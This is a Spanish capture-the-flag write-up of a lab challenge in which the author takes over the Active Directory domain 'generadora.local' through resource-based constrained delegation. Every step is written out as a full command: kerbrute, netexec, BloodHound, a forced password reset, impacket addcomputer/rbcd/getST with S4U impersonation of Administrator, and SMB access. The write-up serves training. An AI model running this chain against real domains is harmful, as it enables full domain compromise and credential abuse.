# Caída del Dominio 1/5 — Active Directory (RBCD)

> Curso: CyberGames_AIEP · Categoría: TI/OT Maqueta Smartcity CUADRANTE 1 · Valor: 300

## Objetivo

Nos piden comprometer el dominio **generadora.local** partiendo desde cero credenciales, encontrar el camino hasta **Domain Admin** y leer la flag en el escritorio del Administrador. El DC es **10.10.10.50**.

## Enumeración

1. Primero levantamos el VPN y empezamos con enumeración de usuarios ocupando **kerbrute**:
   ```
   kerbrute userenum -d generadora.local --dc 10.10.10.50 usuarios.txt
   ```
   Identificamos usuarios válidos: **l.rojas, f.soto, j.parra**.
   ![](../_attachments/)

2. Buscando por los servicios expuestos, en el **puerto 6767** encontramos que los mensajes de error filtran una credencial de otro usuario:
   **`n.errazti : Azin$GH$2026$#`**

3. Validamos la credencial contra el dominio con netexec:
   ```
   nxc smb 10.10.10.50 -u n.errazti -p 'Azin$GH$2026$#'
   ```
   La credencial es válida, ya tenemos nuestro **foothold**.

## Camino de ataque (BloodHound)

4. Recolectamos el dominio con **bloodhound-python** ocupando la credencial de n.errazti:
   ```
   bloodhound-python -u n.errazti -p 'Azin$GH$2026$#' -d generadora.local -ns 10.10.10.50 -c All
   ```

5. Analizando el grafo encontramos la ruta de escalamiento:
   **`n.errazti --ForceChangePassword--> f.soto --AddAllowedToAct--> DC01`**

   Esto significa que podemos cambiarle la clave a **f.soto**, y f.soto tiene permiso para escribir el atributo de **Delegación Basada en Recursos (RBCD)** sobre el **DC01**. Con eso podemos suplantar al Administrador.
   ![](../_attachments/)

## Explotación (RBCD)

6. Primero le cambiamos la contraseña a **f.soto** ocupando el ForceChangePassword:
   ```
   net rpc password f.soto 'SotoPwn2026!' -U 'generadora.local/n.errazti%Azin$GH$2026$#' -S 10.10.10.50
   ```

7. Creamos una cuenta de máquina controlada por nosotros (**EVILPC$**), que es la que vamos a "delegar":
   ```
   impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' \
     -dc-ip 10.10.10.50 'generadora.local/f.soto:SotoPwn2026!'
   ```

8. Configuramos el **RBCD** en el DC01 para que confíe en EVILPC$:
   ```
   impacket-rbcd -delegate-from 'EVILPC$' -delegate-to 'DC01$' -action write \
     -dc-ip 10.10.10.50 'generadora.local/f.soto:SotoPwn2026!'
   ```

9. Pedimos un ticket de servicio (**S4U**) suplantando al **Administrator** para el servicio `cifs/DC01`:
   ```
   impacket-getST -spn cifs/DC01.generadora.local -impersonate Administrator \
     -dc-ip 10.10.10.50 'generadora.local/EVILPC$:EvilPass123!'
   ```
   > Nota: el DC tenía un **desfase de reloj (clock skew)** de ~2h que botaba el S4U con `KRB_AP_ERR_SKEW`. Como no teníamos sudo para cambiar la hora, lo resolvimos parcheando la hora que ocupa impacket (ajustando el `datetime` al reloj del DC obtenido con `nmap --script smb2-time`). Con eso el ticket salió bien.

## Obtención de la flag

10. Exportamos el ticket y nos conectamos por SMB al DC01 como Administrator para leer el escritorio:
    ```
    export KRB5CCNAME=Administrator@cifs_DC01.generadora.local@GENERADORA.LOCAL.ccache
    # lectura de C$\Users\Administrator\Desktop\flag_1.txt
    ```
    ![](../_attachments/)

11. Obtenemos la flag:

**FLAG: `ciberlab{ad_recon_pwn3d}`**

## Conclusión

El camino completo fue **credencial filtrada → ForceChangePassword → RBCD → S4U (impersonar Administrator) → lectura por SMB**. El RBCD es un abuso de delegación bien clásico de AD: no necesitamos la clave del Administrador en ningún momento, solo nos aprovechamos de los permisos mal configurados sobre el objeto del DC. Finalizamos.
